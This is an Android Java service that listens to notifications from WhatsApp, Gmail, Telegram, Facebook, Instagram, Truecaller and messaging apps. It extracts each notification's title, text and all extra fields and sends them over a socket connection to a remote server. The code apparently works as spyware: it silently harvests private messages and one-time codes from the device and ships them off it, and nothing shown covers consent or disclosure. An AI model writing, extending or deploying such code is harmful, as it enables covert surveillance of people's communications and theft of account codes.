package com.service.bob;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

public class MyNotificationListenerService extends NotificationListenerService {

    private static String TAG = "MyNotifListener";

    private Helper helper;
    private SocketManager socketManager;
    private Context context;
    private static final Map<String, Long> sentNotifications = new ConcurrentHashMap<>();
    private static final long CACHE_DURATION_MS = TimeUnit.SECONDS.toMillis(10); // 10 sec window


    // 🔹 Map of package → readable app name
    private static final Map<String, String> APP_NAME_MAP = new HashMap<String, String>() {{
        put("com.whatsapp", "WhatsApp");
        put("com.whatsapp.w4b", "WhatsApp Business");
        put("com.google.android.gm", "Gmail");
        put("com.facebook.katana", "Facebook");
        put("com.facebook.lite", "Facebook Lite");
        put("org.telegram.messenger", "Telegram");
        put("com.truecaller", "Truecaller");
        put("com.instagram.android", "Instagram");
        put("com.facebook.orca", "Facebook Messenger");
        put("com.google.android.apps.messaging", "Google Messages");
        // add more packages here easily — this single map drives both filtering + labeling
    }};

    // 🔹 Derived set for quick lookups
    private static final Set<String> TARGET_PACKAGES = APP_NAME_MAP.keySet();

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        helper = new Helper();
        socketManager = SocketManager.getInstance(context);
        if(!socketManager.isConnected()){
            socketManager.connect();
        }
        TAG = helper.TAG;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String uniqueKey = packageName + "_" + sbn.getId(); // Unique per app+ID
            if (!TARGET_PACKAGES.contains(packageName)) return;

            // 🛑 Skip duplicate within time window
            long now = System.currentTimeMillis();
            if (sentNotifications.containsKey(uniqueKey)
                    && now - sentNotifications.get(uniqueKey) < CACHE_DURATION_MS) {
                Log.d(TAG, "⏩ Skipped duplicate notification: " + uniqueKey);
                return;
            }

            // Clean up old entries
            sentNotifications.entrySet().removeIf(e -> now - e.getValue() > CACHE_DURATION_MS);
            sentNotifications.put(uniqueKey, now);

            Notification notification = sbn.getNotification();
            if (notification == null) return;

            Bundle extras = notification.extras;
            if (extras == null) return;

            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence message = extras.getCharSequence(Notification.EXTRA_TEXT);

            // 🧩 Build structured payload
            JSONObject payload = new JSONObject();
            payload.put("app_package", packageName);
            payload.put("app_name", APP_NAME_MAP.get(packageName));
            payload.put("title", title != null ? title.toString() : "");
            payload.put("message", message != null ? message.toString() : "");
            payload.put("post_time", sbn.getPostTime());

            // Add all extras for debugging / analytics
            JSONObject allData = new JSONObject();
            for (String key : extras.keySet()) {
                try {
                    Object value = extras.get(key);
                    allData.put(key, value != null ? value.toString() : "");
                } catch (Exception ignored) {}
            }
            payload.put("extras", allData);
            helper.show("Noti data " + payload.toString());
            // ✅ Emit notification event via socket
            if (socketManager.isConnected()) {
                socketManager.emit("save_notification", payload);
                Log.i(TAG, "📤 Emitted: " + payload);
            } else {
                Log.w(TAG, "Socket not connected — storing offline or retry later.");
            }

        } catch (Exception e) {
            Log.e(TAG, "Error processing notification: " + e.getMessage(), e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed from: " + sbn.getPackageName());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socketManager != null) socketManager.disconnect();
//        Log.i(TAG, "Notification Listener Service destroyed.");
    }
}
